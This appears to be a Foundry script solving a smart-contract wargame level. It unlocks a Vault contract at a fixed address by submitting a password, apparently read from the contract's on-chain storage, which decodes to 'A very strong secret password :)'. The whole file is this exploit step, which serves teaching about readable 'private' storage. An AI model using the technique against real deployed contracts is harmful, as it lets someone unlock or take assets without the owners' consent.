//SPDX-License-Identifer: MIT

pragma solidity ^0.8.0;

import "../src/Vault.sol";
import "../lib/forge-std/src/Script.sol";
import "../lib/forge-std/src/console.sol";
import "../lib/forge-std/src/Test.sol";

contract VaultSolution is Script {
    
    Vault vaultInstance = Vault(0x77090f22CF464300020F0F9814B63e0be212D53d);
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        vaultInstance.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        vm.stopBroadcast();
    }
}